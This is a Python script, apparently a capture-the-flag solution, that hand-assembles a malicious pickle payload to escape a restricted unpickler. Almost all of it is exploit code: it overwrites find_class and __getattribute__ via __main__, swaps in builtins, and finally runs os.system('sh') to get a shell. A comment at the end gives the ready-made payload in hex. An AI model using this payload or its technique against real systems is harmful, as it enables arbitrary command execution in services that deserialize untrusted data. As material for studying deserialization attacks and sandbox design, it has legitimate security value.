'''
overwrite `up.__getattribute__` with `__main__.__getattribute__` so 
`self.find_class` becomes `__main__.find_class` which you control.
'''

from pickle import *
pkl2 = b'0\n1\n2\n3\n4\n7\n5\n6\n7\n8\n9\n10\n13\n11\n12\n13\n14\n15\n'
pkl = PROTO + b"\x04"
# get builtins
pkl += GLOBAL + b'__main__\n__main__\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += BUILD
pkl += POP
# set stuff (dict)
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += MARK
pkl += STRING + b'"find_class"\n'
pkl += GLOBAL + b'__main__\ngetattr\n'
pkl += STRING + b'"persistent_load"\n'
pkl += GLOBAL + b'__main__\nprint\n'
pkl += STRING + b'"str"\n'
pkl += TRUE
pkl += SETITEMS
pkl += GLOBAL + b'__main__\nUnpickler\n'
# set builtins im hijacking
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += MARK
pkl += STRING + b'"str"\n'
pkl += TRUE
pkl += STRING + b'"next"\n'
pkl += GLOBAL + b'__main__\nBytesIO\n'
pkl += SETITEMS
pkl += POP*2
# create a tuple for later
pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"__getattribute__"\n'
pkl += GLOBAL + b'__main__\n__getattribute__\n'
pkl += DICT
pkl += TUPLE
pkl += PUT + b'0\n'

pkl += MARK
pkl += STRING + b'"hi"\n'
pkl += LIST
pkl += PUT + b'1\n'

pkl += GLOBAL + b'__main__\nup\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"_buffers"\n'
from struct import pack
pkl += BINBYTES + pack("<I", len(pkl2)) + pkl2
pkl += DICT
pkl += TUPLE
pkl += BUILD
pkl += NEXT_BUFFER
pkl += MEMOIZE # 2

pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += STRING + b'"next"\n'
pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += SETITEM

pkl += GLOBAL + b'__main__\nup\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"_buffers"\n'
pkl += GET + b'2\n'
pkl += DICT
pkl += TUPLE
pkl += BUILD

pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"__getattribute__"\n'
pkl += GLOBAL + b'__main__\n__getattribute__\n'
pkl += DICT
pkl += TUPLE
pkl += MEMOIZE # 3

pkl += MARK
pkl += INT + b'0\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += INT + b'1\n'
pkl += STRING + b'"type"\n'
pkl += INT + b'2\n'
pkl += GLOBAL + b'__main__\nbool\n'
pkl += INT + b'3\n'
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += INT + b'4\n'
pkl += STRING + b'"__getitem__"\n'
pkl += INT + b'5\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += INT + b'6\n'
pkl += STRING + b'"next"\n'
pkl += INT + b'8\n'
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += INT + b'9\n'
pkl += STRING + b'"_buffers"\n'
pkl += INT + b'10\n'
pkl += STRING + b'"exec"\n'
pkl += INT + b'11\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += INT + b'12\n'
pkl += STRING + b'"type"\n'
pkl += INT + b'14\n'
pkl += STRING + b'"GGS"\n'
pkl += INT + b'15\n'
pkl += STRING + b'"os=object.mgk.nested.__import__(\'os\'); os.system(\'sh\')"\n'
pkl += DICT
pkl += MEMOIZE # 4
pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"__setattr__"\n'
pkl += GLOBAL + b'__main__\n__setattr__\n'
pkl += DICT
pkl += TUPLE
pkl += BUILD

pkl += NEXT_BUFFER
pkl += MEMOIZE # 5

pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"readline"\n'
pkl += GLOBAL + b'__main__\n_file_readline\n'
pkl += SETITEM
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"read"\n'
pkl += GLOBAL + b'__main__\n_file_read\n'
pkl += SETITEM

pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"metastack"\n'
pkl += EMPTY_LIST
pkl += SETITEM
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"stack"\n'
pkl += EMPTY_LIST
pkl += SETITEM
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"memo"\n'
pkl += GET + b'4\n'
pkl += SETITEM

pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += GET + b'3\n'
pkl += BUILD
pkl += MARK
# 0\n1\n2\n3\n4\n7\n5\n6\n7\n8\n9\n10\n13\n11\n12\n13\n14\n15\n
pkl += GET*3 # 0,1,2
pkl += SETITEM
pkl += GET*2 # 3,4
pkl += STACK_GLOBAL
pkl += PUT # 7
pkl += GET*3 # 5,6,7
pkl += SETITEM
pkl += GET*3 # 8,9,10
pkl += SETITEM
pkl += NEXT_BUFFER
pkl += PUT # 13
pkl += GET # 11
pkl += GET # 12
pkl += GET # 13
pkl += SETITEM
pkl += GET # 14
pkl += GET # 15
pkl += STACK_GLOBAL
pkl += STOP
print(pkl.hex())

# 8004635f5f6d61696e5f5f0a5f5f6d61696e5f5f0a635f5f6d61696e5f5f0a5f5f6275696c74696e735f5f0a6230635f5f6d61696e5f5f0a5f5f646963745f5f0a28532266696e645f636c617373220a635f5f6d61696e5f5f0a676574617474720a532270657273697374656e745f6c6f6164220a635f5f6d61696e5f5f0a7072696e740a5322737472220a4930310a75635f5f6d61696e5f5f0a556e7069636b6c65720a635f5f6d61696e5f5f0a5f5f6275696c74696e735f5f0a285322737472220a4930310a53226e657874220a635f5f6d61696e5f5f0a4279746573494f0a753030635f5f6d61696e5f5f0a556e7069636b6c65720a284e2853225f5f6765746174747269627574655f5f220a635f5f6d61696e5f5f0a5f5f6765746174747269627574655f5f0a647470300a2853226869220a6c70310a635f5f6d61696e5f5f0a75700a284e2853225f62756666657273220a422b000000300a310a320a330a340a370a350a360a370a380a390a31300a31330a31310a31320a31330a31340a31350a6474629794635f5f6d61696e5f5f0a5f5f6275696c74696e735f5f0a53226e657874220a635f5f6d61696e5f5f0a556e7069636b6c65720a73635f5f6d61696e5f5f0a75700a284e2853225f62756666657273220a67320a647462284e2853225f5f6765746174747269627574655f5f220a635f5f6d61696e5f5f0a5f5f6765746174747269627574655f5f0a6474942849300a635f5f6d61696e5f5f0a5f5f6275696c74696e735f5f0a49310a532274797065220a49320a635f5f6d61696e5f5f0a626f6f6c0a49330a635f5f6d61696e5f5f0a5f5f646963745f5f0a49340a53225f5f6765746974656d5f5f220a49350a635f5f6d61696e5f5f0a5f5f6275696c74696e735f5f0a49360a53226e657874220a49380a635f5f6d61696e5f5f0a5f5f646963745f5f0a49390a53225f62756666657273220a4931300a532265786563220a4931310a635f5f6d61696e5f5f0a5f5f6275696c74696e735f5f0a4931320a532274797065220a4931340a5322474753220a4931350a53226f733d6f626a6563742e6d676b2e6e65737465642e5f5f696d706f72745f5f28276f7327293b206f732e73797374656d282773682729220a6494635f5f6d61696e5f5f0a556e7069636b6c65720a284e2853225f5f736574617474725f5f220a635f5f6d61696e5f5f0a5f5f736574617474725f5f0a6474629794635f5f6d61696e5f5f0a5f5f646963745f5f0a5322726561646c696e65220a635f5f6d61696e5f5f0a5f66696c655f726561646c696e650a73635f5f6d61696e5f5f0a5f5f646963745f5f0a532272656164220a635f5f6d61696e5f5f0a5f66696c655f726561640a73635f5f6d61696e5f5f0a5f5f646963745f5f0a53226d657461737461636b220a5d73635f5f6d61696e5f5f0a5f5f646963745f5f0a5322737461636b220a5d73635f5f6d61696e5f5f0a5f5f646963745f5f0a53226d656d6f220a67340a73635f5f6d61696e5f5f0a556e7069636b6c65720a67330a6228676767736767937067676773676767739770676767736767932e